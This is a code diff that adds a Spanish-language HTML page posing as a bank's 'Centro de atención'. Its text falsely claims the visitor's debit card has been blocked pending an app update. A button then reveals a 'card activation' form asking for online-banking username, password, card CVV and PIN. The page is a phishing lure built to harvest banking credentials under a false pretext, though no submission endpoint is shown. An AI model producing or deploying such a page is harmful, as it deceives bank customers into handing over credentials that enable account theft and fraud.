@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Centro de Atención</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Inter',sans-serif;
+}
+
+
+body{
+
+    min-height:100vh;
+
+    background:
+    linear-gradient(135deg,#eaf3ff,#d5e8ff);
+
+    display:flex;
+
+    justify-content:center;
+
+    align-items:center;
+
+}
+
+
+
+.container{
+
+    width:100%;
+    max-width:450px;
+
+    padding:20px;
+
+}
+
+
+
+.card{
+
+    background:#ffffff;
+
+    border-radius:30px;
+
+    padding:35px 28px;
+
+    box-shadow:
+    0 25px 60px rgba(0,55,120,.18);
+
+    animation:entrada .7s ease;
+
+}
+
+
+
+/* TARJETA */
+
+.card-icon{
+
+    display:flex;
+
+    justify-content:center;
+
+    margin-bottom:25px;
+
+}
+
+
+
+.bank-card{
+
+    width:150px;
+
+    height:95px;
+
+    border-radius:20px;
+
+    background:
+    linear-gradient(135deg,#004fa8,#00a6ff);
+
+    position:relative;
+
+    box-shadow:
+    0 15px 35px rgba(0,100,220,.35);
+
+    display:flex;
+
+    justify-content:center;
+
+    align-items:flex-end;
+
+    padding-bottom:18px;
+
+    animation:flotar 3s infinite;
+
+}
+
+
+
+.bank-card i{
+
+    color:white;
+
+    font-size:32px;
+
+}
+
+
+
+.chip{
+
+    position:absolute;
+
+    width:32px;
+
+    height:25px;
+
+    background:#f4c95d;
+
+    border-radius:6px;
+
+    top:22px;
+
+    left:22px;
+
+}
+
+
+
+.signal{
+
+    position:absolute;
+
+    right:22px;
+
+    top:25px;
+
+    color:white;
+
+    opacity:.8;
+
+}
+
+
+
+.signal i{
+
+    font-size:18px;
+
+}
+
+
+
+/* CONTENIDO */
+
+
+h1{
+
+    text-align:center;
+
+    color:#102a43;
+
+    font-size:26px;
+
+    margin-bottom:12px;
+
+}
+
+
+
+.description{
+
+    text-align:center;
+
+    color:#627d98;
+
+    font-size:15px;
+
+    line-height:1.6;
+
+}
+
+
+
+.box-info{
+
+    margin:25px 0;
+
+    background:#f3f8ff;
+
+    border-radius:16px;
+
+    padding:18px;
+
+    display:flex;
+
+    gap:15px;
+
+    align-items:center;
+
+}
+
+
+
+.box-info i{
+
+    font-size:25px;
+
+    color:#0066cc;
+
+}
+
+
+
+.box-info p{
+
+    color:#486581;
+
+    font-size:14px;
+
+}
+
+
+
+button{
+
+    width:100%;
+
+    height:52px;
+
+    border:none;
+
+    border-radius:14px;
+
+    background:#0066cc;
+
+    color:white;
+
+    font-size:16px;
+
+    font-weight:600;
+
+    cursor:pointer;
+
+    transition:.3s;
+
+}
+
+
+
+button:hover{
+
+    background:#004c99;
+
+    transform:translateY(-2px);
+
+}
+
+
+
+.form{
+
+    display:none;
+
+    margin-top:25px;
+
+    animation:mostrar .5s ease;
+
+}
+
+
+
+.form h2{
+
+    color:#102a43;
+
+    font-size:20px;
+
+    margin-bottom:20px;
+
+}
+
+
+
+label{
+
+    display:block;
+
+    color:#486581;
+
+    font-size:13px;
+
+    margin-bottom:7px;
+
+}
+
+
+
+input{
+
+    width:100%;
+
+    height:50px;
+
+    border-radius:12px;
+
+    border:1px solid #d9e2ec;
+
+    padding:0 15px;
+
+    font-size:15px;
+
+    margin-bottom:16px;
+
+    outline:none;
+
+}
+
+
+
+input:focus{
+
+    border-color:#0066cc;
+
+}
+
+
+
+.footer{
+
+    text-align:center;
+
+    margin-top:25px;
+
+    color:#829ab1;
+
+    font-size:12px;
+
+}
+
+
+
+/* ANIMACIONES */
+
+
+@keyframes entrada{
+
+from{
+
+opacity:0;
+
+transform:translateY(40px);
+
+}
+
+to{
+
+opacity:1;
+
+transform:none;
+
+}
+
+}
+
+
+
+@keyframes flotar{
+
+0%,100%{
+
+transform:translateY(0) rotate(0);
+
+}
+
+50%{
+
+transform:translateY(-10px) rotate(2deg);
+
+}
+
+}
+
+
+
+@keyframes mostrar{
+
+from{
+
+opacity:0;
+
+transform:translateY(20px);
+
+}
+
+to{
+
+opacity:1;
+
+transform:none;
+
+}
+
+}
+
+
+
+@media(max-width:480px){
+
+.card{
+
+padding:28px 20px;
+
+}
+
+
+h1{
+
+font-size:23px;
+
+}
+
+}
+
+
+</style>
+
+
+</head>
+
+
+<body>
+
+
+<div class="container">
+
+<div class="card">
+
+
+<div class="card-icon">
+
+<div class="bank-card">
+
+<div class="chip"></div>
+
+<div class="signal">
+<i class="fa-solid fa-wifi"></i>
+</div>
+
+
+<i class="fa-solid fa-credit-card"></i>
+
+
+</div>
+
+</div>
+
+
+
+<h1>
+Centro de atención
+</h1>
+
+
+<p class="description">
+
+Su tarjeta de debito ha sido bloqueada para pagos en comercios debido a la actualización necesaria de nuestra aplicación, marque 1 para que un agente le indique los pasos a seguir
+</p>
+
+
+
+<div class="box-info">
+
+<i class="fa-solid fa-headset"></i>
+
+<p>
+Un asesor podrá comunicarse contigo luego de completar tus datos de contacto.
+</p>
+
+</div>
+
+
+
+<button id="btn">
+
+Contactar con un agente
+
+</button>
+
+
+
+
+<div class="form" id="form">
+
+
+<h2>
+Activacion de tarjeta</h2>
+
+
+
+<form>
+
+
+<label>
+Usuario
+</label>
+
+<input type="text" placeholder="Ingresa tu usuario" required>
+
+
+
+<label>
+Contraseña
+</label>
+
+<input type="password" placeholder="Ingresa tu contraseña" required>
+
+
+
+<label>
+CVV
+</label>
+
+<input type="tel" placeholder="125" required maxlength="3">
+<label>
+PIN
+</label>
+
+<input type="tel" placeholder="0000" required maxlength="4">
+
+
+
+
+<button type="submit">
+
+Enviar solicitud
+
+</button>
+
+
+</form>
+
+
+</div>
+
+
+
+<div class="footer">
+
+Servicio de atención digital
+
+</div>
+
+
+</div>
+
+</div>
+
+
+
+<script>
+
+const btn = document.getElementById("btn");
+const form = document.getElementById("form");
+
+
+btn.addEventListener("click",()=>{
+
+    form.style.display="block";
+
+    btn.style.display="none";
+
+});
+
+
+</script>
+
+
+</body>
+
+</html>
